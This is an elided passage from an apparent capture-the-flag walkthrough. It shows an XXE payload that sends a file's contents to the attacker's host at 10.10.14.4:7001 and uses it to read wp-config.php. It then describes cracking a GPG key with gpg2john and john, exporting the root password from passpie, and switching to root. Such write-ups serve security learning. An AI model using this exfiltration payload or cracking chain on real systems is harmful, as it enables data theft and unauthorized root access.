...
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.4:7001/?p=%file;'>" >
```
After uploading our new payload we can decode the response and we can see our path to the wp-config.php file.
...
Let's try cracking the key, starting with using `gpg2john` to convert it to a format we can use with `john`
...
In the ![github for `passpie`](https://github.com/marcwebbie/passpie), we can see all of the commands, looks like we can export the password for root.
...
version: 1.0
```
Simple `su` to root, enter in the password and we're in!
